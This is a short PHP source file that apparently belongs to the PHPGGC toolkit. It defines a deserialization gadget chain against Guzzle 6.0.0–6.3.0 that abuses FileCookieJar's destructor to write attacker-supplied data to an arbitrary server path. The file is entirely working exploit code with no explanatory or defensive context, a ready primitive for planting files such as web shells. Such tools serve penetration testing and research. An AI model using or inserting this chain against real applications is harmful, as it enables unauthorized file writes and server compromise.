<?php

namespace GadgetChain\Guzzle;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
	public $version = '6.0.0 <= 6.3.0';
	public $vector = '__destruct';
	public $author = 'cf';

	public function generate(array $parameters)
	{
		$path = $parameters['remote_path'];
		$data = $parameters['data'];

		return new \GuzzleHttp\Cookie\FileCookieJar($path, $data);
	}
}